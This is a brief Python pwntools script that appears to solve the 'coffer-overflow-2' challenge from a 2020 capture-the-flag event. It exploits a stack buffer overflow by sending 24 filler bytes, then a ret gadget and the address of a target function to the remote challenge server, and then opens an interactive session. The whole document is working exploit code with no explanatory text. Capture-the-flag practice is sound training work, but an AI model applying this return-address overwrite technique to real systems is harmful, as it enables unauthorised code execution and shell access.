#!/usr/bin/python3

from pwn import *

#p = process("./coffer-overflow-2")

p = remote("2020.redpwnc.tf",31908)

offset = 16 + 8
binfunc = p64(0x00000000004006e6)
ret = p64(0x000000000040053e)

payload = b"M"*offset + ret + binfunc

for i in range(2):
	p.recvline()

p.sendline(payload)

p.interactive()